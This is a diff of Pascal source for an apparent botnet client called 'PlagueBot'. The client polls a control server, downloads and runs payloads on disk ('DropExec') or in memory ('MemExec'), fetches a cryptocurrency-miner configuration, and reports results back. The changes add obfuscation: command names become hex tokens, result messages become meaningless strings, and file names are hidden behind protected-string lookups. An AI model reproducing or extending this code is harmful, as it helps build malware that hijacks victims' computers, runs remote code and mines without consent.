@@ -152,8 +152,9 @@ Begin
   _ToPost.AddFormField('ID', AbortID);
   _ToPost.AddFormField('RT', '1');
   _ToPost.AddFormField('Result', 'Abort successful.');
+  Hat.Post(Server+ResultsPHP, _ToPost);
   {$IFDEF Debug}
-  Writeln('[',FIndex,'] ABORT-POST --> ',Hat.Post(Server+ResultsPHP, _ToPost));
+  Writeln('[',FIndex,'] ABORT');
   {$ENDIF}
   _ToPost.Free;
   Terminate;
@@ -173,7 +174,7 @@ var
   MemDLLModule: PBTMemoryModule;
 
   UP: TIdUDPClient;
-  STemp, STemp2: String;
+  STemp, STemp2, CmdType: String;
 
   procedure DoPost;
   var {%H-}Q: String;
@@ -195,8 +196,13 @@ Begin
   Hat.Request.Connection:='keep-alive';
   Hat.Request.UserAgent:='PlagueBot';
   ToPost:=TIdMultipartFormDataStream.Create;
+  CmdType:=Net.Commands.ReadString(FCmdID, 'Type', '');
+  //STRING TABLE
+    if CmdType=GetProtectedString(1) then CmdType:='bb32d835'
+    else if CmdType=GetProtectedString(2) then CmdType:='896bb1db';
+  //END STRING TABLE
   try
-  Case Net.Commands.ReadString(FCmdID, 'Type', '') of
+  Case CmdType of
     'Register': Begin
       ToPost.AddFormField('RT', '3');
 
@@ -294,10 +300,10 @@ Begin
       end;
       MemStream.Free;
       if Not(Error) then
-        ToPost.AddFormField('Result', 'Download successful.');
+        ToPost.AddFormField('Result', 'ododd');
       DoPost;
     end;
-    'DropExec': Begin
+    '896bb1db': Begin
       ToPost.AddFormField('RT', '1');
       MemStream:=TMemoryStream.Create;
       try
@@ -343,7 +349,7 @@ Begin
       DoPost;
       ChDel('Drop.exe');
     end;
-    'MemExec': Begin
+    'bb32d835': Begin
       ToPost.AddFormField('RT', '1');
       MemStream:=TMemoryStream.Create;
       try
@@ -440,7 +446,7 @@ Begin
         //Download config
         STemp:=StringReplace(Hat.Get(Server+MineConfig), '%WorkerID%', STemp2,
           [rfReplaceAll, rfIgnoreCase]);
-        AssignFile(FFile, 'config.json');
+        AssignFile(FFile, GetProtectedString(0));
         Rewrite(FFile);
         Write(FFile, STemp);
         CloseFile(FFile);
